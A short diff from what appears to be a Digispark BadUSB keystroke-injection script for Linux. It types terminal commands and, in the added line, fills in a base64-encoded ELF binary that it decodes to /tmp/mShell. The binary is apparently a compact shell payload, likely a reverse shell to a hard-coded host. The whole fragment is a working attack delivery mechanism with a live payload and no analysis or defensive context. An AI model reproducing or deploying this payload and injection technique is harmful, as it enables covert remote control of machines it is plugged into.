@@ -12,7 +12,7 @@ delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
 // Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
 delay(1000);
-DigiKeyboard.print("echo Base64_goes_here/+E= | base64 --decode > /tmp/mShell");
+DigiKeyboard.print("echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgACD2gCAANwieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A/+E= | base64 --decode > /tmp/mShell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 
